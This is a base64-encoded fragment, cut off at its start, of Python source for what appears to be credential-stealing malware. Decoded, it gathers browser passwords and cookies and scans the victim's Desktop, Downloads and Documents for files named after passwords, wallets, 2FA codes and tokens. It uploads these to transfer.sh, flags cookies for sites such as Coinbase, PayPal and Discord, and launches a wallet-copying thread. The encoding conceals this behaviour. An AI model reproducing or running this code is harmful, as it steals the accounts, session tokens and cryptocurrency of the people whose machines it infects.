BhdHRbMV1dKS5zdGFydCgpCiAgICBmb3IgcGF0dCBpbiBQYXRoc196aXBwZWQ6CiAgICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9WmlwTXlUaGluZ3MsIGFyZ3M9W3BhdHRbMF0sIHBhdHRbMl0sIHBhdHRbMV1dKS5zdGFydCgpCiAgICBmb3IgdGhyZWFkIGluIFRocmVhZGxpc3Q6CiAgICAgICAgdGhyZWFkLmpvaW4oKQogICAgZ2xvYmFsIHVwdGhzCiAgICB1cHRocyA9IFtdCgogICAgZm9yIGZpbGUgaW4gWyJiY19hbGxwYXNzd29yZHMudHh0IiwgImJjX2FsbGNvb2tpZXMudHh0Il06CiAgICAgICAgdXBsb2FkKG9zLmdldGVudigiVEVNUCIpICsgIlxcIiArIGZpbGUpCgoKZGVmIFVwbG9hZFRvX0Fub24ocGF0aCk6CiAgICB0cnk6CiAgICAgICAgZmlsZXMgPSB7ImZpbGUiOiAocGF0aCwgb3BlbihwYXRoLCBtb2RlPSJyYiIpKX0KICAgICAgICAuLi4KICAgICAgICB1cGxvYWQgPSByZXF1ZXN0cy5wb3N0KCJodHRwczovL3RyYW5zZmVyLnNoLyIsIGZpbGVzPWZpbGVzKQogICAgICAgIHVybCA9IHVwbG9hZC50ZXh0CiAgICAgICAgcmV0dXJuIHVybAogICAgZXhjZXB0OgogICAgICAgIHJldHVybiBGYWxzZQoKCmRlZiBDcmVhdGVGb2xkZXJfKHBhdGhGLCBrZXl3b3Jkcyk6CiAgICBnbG9iYWwgYmNfY3JlYXRlX2ZpbGVzCiAgICBtYXhmaWxlc3BlcmRpciA9IDcKICAgIGkgPSAwCiAgICBsaXN0T2ZGaWxlID0gb3MubGlzdGRpcihwYXRoRikKICAgIGZmb3VuZCA9IFtdCiAgICBmb3IgZmlsZSBpbiBsaXN0T2ZGaWxlOgogICAgICAgIGlmIG5vdCBvcy5wYXRoLmlzZmlsZShwYXRoRiArICIvIiArIGZpbGUpOgogICAgICAgICAgICByZXR1cm4KICAgICAgICBpICs9IDEKICAgICAgICBpZiBpIDw9IG1heGZpbGVzcGVyZGlyOgogICAgICAgICAgICB1cmwgPSBVcGxvYWRUb19Bbm9uKHBhdGhGICsgIi8iICsgZmlsZSkKICAgICAgICAgICAgZmZvdW5kLmFwcGVuZChbcGF0aEYgKyAiLyIgKyBmaWxlLCB1cmxdKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGJyZWFrCiAgICBiY19jcmVhdGVfZmlsZXMuYXBwZW5kKFsiZm9sZGVyIiwgcGF0aEYgKyAiLyIsIGZmb3VuZF0pCgoKYmNfY3JlYXRlX2ZpbGVzID0gW10KCgpkZWYgYmNfY3JlYXRlX2ZpbGUocGF0aCwga2V5d29yZHMpOgogICAgZ2xvYmFsIGJjX2NyZWF0ZV9maWxlcwogICAgZmlmb3VuZCA9IFtdCiAgICBsaXN0T2ZGaWxlID0gb3MubGlzdGRpcihwYXRoKQogICAgZm9yIGZpbGUgaW4gbGlzdE9mRmlsZToKICAgICAgICBmb3Igd29yZiBpbiBrZXl3b3JkczoKICAgICAgICAgICAgaWYgd29yZiBpbiBmaWxlLmxvd2VyKCk6CiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmlzZmlsZShwYXRoICsgIi8iICsgZmlsZSkgYW5kICIudHh0IiBpbiBmaWxlOgogICAgICAgICAgICAgICAgICAgIGZpZm91bmQuYXBwZW5kKAogICAgICAgICAgICAgICAgICAgICAgICBbcGF0aCArICIvIiArIGZpbGUsIFVwbG9hZFRvX0Fub24ocGF0aCArICIvIiArIGZpbGUpXQogICAgICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgaWYgb3MucGF0aC5pc2RpcihwYXRoICsgIi8iICsgZmlsZSk6CiAgICAgICAgICAgICAgICAgICAgdGFyZ2V0ID0gcGF0aCArICIvIiArIGZpbGUKICAgICAgICAgICAgICAgICAgICBDcmVhdGVGb2xkZXJfKHRhcmdldCwga2V5d29yZHMpCiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgIGJjX2NyZWF0ZV9maWxlcy5hcHBlbmQoWyJmb2xkZXIiLCBwYXRoLCBmaWZvdW5kXSkKCgpkZWYgY2hlY2tfc3BlY19iYygpOgogICAgdXNlciA9IHRlbXAuc3BsaXQoIlxBcHBEYXRhIilbMF0KICAgIHBhdGgyc2VhcmNoID0gW3VzZXIgKyAiL0Rlc2t0b3AiLCB1c2VyICsgIi9Eb3dubG9hZHMiLCB1c2VyICsgIi9Eb2N1bWVudHMiXQoKICAgIGtleV93b3Jkc0ZpbGVzID0gWwogICAgICAgICJwYXNzdyIsCiAgICAgICAgIm1kcCIsCiAgICAgICAgIm1vdGRlcGFzc2UiLAogICAgICAgICJtb3RfZGVfcGFzc2UiLAogICAgICAgICJsb2dpbiIsCiAgICAgICAgInNlY3JldCIsCiAgICAgICAgImFjY291bnQiLAogICAgICAgICJhY291bnQiLAogICAgICAgICJwYXlwYWwiLAogICAgICAgICJiYW5xdWUiLAogICAgICAgICJtZXRhbWFzayIsCiAgICAgICAgIndhbGxldCIsCiAgICAgICAgImNyeXB0byIsCiAgICAgICAgImV4b2R1cyIsCiAgICAgICAgImRpc2NvcmQiLAogICAgICAgICIyZmEiLAogICAgICAgICJjb2RlIiwKICAgICAgICAibWVtbyIsCiAgICAgICAgImNvbXB0ZSIsCiAgICAgICAgInRva2VuIiwKICAgICAgICAiYmFja3VwIiwKICAgICAgICAic2VlY3JldCIsCiAgICBdCgogICAgd2lraXRoID0gW10KICAgIGZvciBwYXR0IGluIHBhdGgyc2VhcmNoOgogICAgICAgIGNoZWNrX3NwZWNfYmMgPSB0aHJlYWRpbmcuVGhyZWFkKAogICAgICAgICAgICB0YXJnZXQ9YmNfY3JlYXRlX2ZpbGUsIGFyZ3M9W3BhdHQsIGtleV93b3Jkc0ZpbGVzXQogICAgICAgICkKICAgICAgICBjaGVja19zcGVjX2JjLnN0YXJ0KCkKICAgICAgICB3aWtpdGguYXBwZW5kKGNoZWNrX3NwZWNfYmMpCiAgICByZXR1cm4gd2lraXRoCgoKZ2xvYmFsIGtleXdvcmQsIGNvb2tpV29yZHMsIHBhc3dXb3JkcwoKa2V5d29yZCA9IFsKICAgICJtYWlsIiwKICAgICJbY29pbmJhc2VdKGh0dHBzOi8vY29pbmJhc2UuY29tKSIsCiAgICAiW3NlbGxpeF0oaHR0cHM6Ly9zZWxsaXguaW8pIiwKICAgICJbZ21haWxdKGh0dHBzOi8vZ21haWwuY29tKSIsCiAgICAiW3N0ZWFtXShodHRwczovL3N0ZWFtLmNvbSkiLAogICAgIltkaXNjb3JkXShodHRwczovL2Rpc2NvcmQuY29tKSIsCiAgICAiW3Jpb3RnYW1lc10oaHR0cHM6Ly9yaW90Z2FtZXMuY29tKSIsCiAgICAiW3lvdXR1YmVdKGh0dHBzOi8veW91dHViZS5jb20pIiwKICAgICJbaW5zdGFncmFtXShodHRwczovL2luc3RhZ3JhbS5jb20pIiwKICAgICJbdGlrdG9rXShodHRwczovL3Rpa3Rvay5jb20pIiwKICAgICJbdHdpdHRlcl0oaHR0cHM6Ly90d2l0dGVyLmNvbSkiLAogICAgIltmYWNlYm9va10oaHR0cHM6Ly9mYWNlYm9vay5jb20pIiwKICAgICJjYXJkIiwKICAgICJbZXBpY2dhbWVzXShodHRwczovL2VwaWNnYW1lcy5jb20pIiwKICAgICJbc3BvdGlmeV0oaHR0cHM6Ly9zcG90aWZ5LmNvbSkiLAogICAgIlt5YWhvb10oaHR0cHM6Ly95YWhvby5jb20pIiwKICAgICJbcm9ibG94XShodHRwczovL3JvYmxveC5jb20pIiwKICAgICJbdHdpdGNoXShodHRwczovL3R3aXRjaC5jb20pIiwKICAgICJbbWluZWNyYWZ0XShodHRwczovL21pbmVjcmFmdC5uZXQpIiwKICAgICJiYW5rIiwKICAgICJbcGF5cGFsXShodHRwczovL3BheXBhbC5jb20pIiwKICAgICJbb3JpZ2luXShodHRwczovL29yaWdpbi5jb20pIiwKICAgICJbYW1hem9uXShodHRwczovL2FtYXpvbi5jb20pIiwKICAgICJbZWJheV0oaHR0cHM6Ly9lYmF5LmNvbSkiLAogICAgIlthbGlleHByZXNzXShodHRwczovL2FsaWV4cHJlc3MuY29tKSIsCiAgICAiW3BsYXlzdGF0aW9uXShodHRwczovL3BsYXlzdGF0aW9uLmNvbSkiLAogICAgIltoYm9dKGh0dHBzOi8vaGJvLmNvbSkiLAogICAgIlt4Ym94XShodHRwczovL3hib3guY29tKSIsCiAgICAiYnV5IiwKICAgICJzZWxsIiwKICAgICJbYmluYW5jZV0oaHR0cHM6Ly9iaW5hbmNlLmNvbSkiLAogICAgIltob3RtYWlsXShodHRwczovL2hvdG1haWwuY29tKSIsCiAgICAiW291dGxvb2tdKGh0dHBzOi8vb3V0bG9vay5jb20pIiwKICAgICJbY3J1bmNoeXJvbGxdKGh0dHBzOi8vY3J1bmNoeXJvbGwuY29tKSIsCiAgICAiW3RlbGVncmFtXShodHRwczovL3RlbGVncmFtLmNvbSkiLAogICAgIltwb3JuaHViXShodHRwczovL3Bvcm5odWIuY29tKSIsCiAgICAiW2Rpc25leV0oaHR0cHM6Ly9kaXNuZXkuY29tKSIsCiAgICAiW2V4cHJlc3N2cG5dKGh0dHBzOi8vZXhwcmVzc3Zwbi5jb20pIiwKICAgICJjcnlwdG8iLAogICAgIlt1YmVyXShodHRwczovL3ViZXIuY29tKSIsCiAgICAiW25ldGZsaXhdKGh0dHBzOi8vbmV0ZmxpeC5jb20pIiwKXQoKCmNvb2tpV29yZHMgPSBbXQpwYXN3V29yZHMgPSBbXQoKYmNfR2F0aGVyX0FsbCgpCkRFVEVDVEVEID0gVHJ1c3QoQ29va2llcykKCmlmIG5vdCBERVRFQ1RFRDoKICAgIHdpa2l0aCA9IGNoZWNrX3NwZWNfYmMoKQoKICAgIGZvciB0aHJlYWQgaW4gd2lraXRoOgogICAgICAgIHRocmVhZC5qb2luKCkKICAgIHRpbWUuc2xlZXAoMC4yKQoKICAgIGZpbGV0ZXh0ID0gImBgYGRpZmZcbiIKICAgIGZvciBhcmcgaW4gYmNfY3JlYXRlX2ZpbGVzOgogICAgICAgIGlmIGxlbihhcmdbMl0pICE9IDA6CiAgICAgICAgICAgIGZvbGRwYXRoID0gYXJnWzFdCiAgICAgICAgICAgIGZvbGRsaXN0ID0gYXJnWzJdCiAgICAgICAgICAgIGZpbGV0ZXh0ICs9IGYiXG4iCiAgICAgICAgICAgIGZpbGV0ZXh0ICs9IGYiLSB7Zm9sZHBhdGh9XG4iCgogICAgICAgICAgICBmb3IgZmZpbCBpbiBmb2xkbGlzdDoKICAgICAgICAgICAgICAgIGEgPSBmZmlsWzBdLnNwbGl0KCIvIikKICAgICAgICAgICAgICAgIGZpbGVhbm1lID0gYVtsZW4oYSkgLSAxXQogICAgICAgICAgICAgICAgYiA9IGZmaWxbMV0KICAgICAgICAgICAgICAgIGZpbGV0ZXh0ICs9IGYiKyBOYW1lOiB7ZmlsZWFubWV9XG4rIExpbms6IHtifSIKICAgICAgICAgICAgICAgIGZpbGV0ZXh0ICs9ICJcbiIKICAgIGZpbGV0ZXh0ICs9ICJcbmBgYCIKCiAgICB1cGxvYWQoImNoZWNrX3NwZWNfYmMiLCBmaWxldGV4dCkKICAgIGF1dG8gPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1hdXRvX2NvcHlfd2FsbGV0KCkucnVuKQogICAgYXV0by5zdGFydCgpCg==
